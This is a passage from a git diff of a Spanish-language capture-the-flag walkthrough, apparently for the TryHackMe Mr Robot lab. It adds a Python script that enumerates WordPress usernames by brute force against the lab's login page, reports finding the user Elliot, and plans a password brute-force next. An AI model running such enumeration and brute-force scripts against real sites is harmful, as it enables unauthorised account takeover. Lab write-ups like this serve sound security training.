@@ -86,8 +86,46 @@ tags:
   </div>
 
   Ya sabiendo esto me dirijo al la ruta **wp-login** ahi veo que es un login de wordpress, en algunas ocasiones los logins de wordpress te permiten enumerar usuarios ya que si ponemos uno valido nos saldria un mensaje diciendo '**ERROR: The password you entered for the username Winsad is incorrect. Lost your password?**' por ejemplo.
+
   Para esto y ya que no conocemos los usuarios usaremos el dic para hacer un ataque de fuerza bruta, para este ataque hare un script personalizado en python el cual es el siguiete:
 
-  '''python3
-     import si
-  '''
+  ```python
+    #!/usr/bin/python
+
+import requests, time
+from pwn import *
+
+
+url = 'http://10.10.197.4/wp-login.php'
+
+s = requests.Session()
+print ''
+p1 = log.progress("Fuzzeando usuario")
+time.sleep(3)
+p1.status("Iniciando Fuzzing")
+time.sleep(3)
+
+with open('fsocity.dic', 'r') as f:
+	for i in f:
+
+		data = {'log' : i,
+			'pwd' : 'contra'
+			}
+
+		r = s.post(url, data)
+		p1.status('Probando %s' % i.strip('\n'))
+
+		if "Invalid username." not in r.text:
+			p1.success('Usuario el usuario %s valido ' % i.strip('\n'))
+			break
+  ```
+
+  Con el script que me acabo de desarollar pude descubrir que el usuario **Elliot** es un usuario valido:
+
+  <p align="center">
+  <img src="https://raw.githubusercontent.com/Wiinsad/winsad/master/assets/images/machines/THM/MrRobot/scan/fuzzU.png">
+  </p>
+
+  Ahora que tenemos el usuario haremos una fuerza bruta a la password del usuario Elliot, para esto adapataremos un poco el script para que ahora itere sobre la password y no el usuario:
+
+  
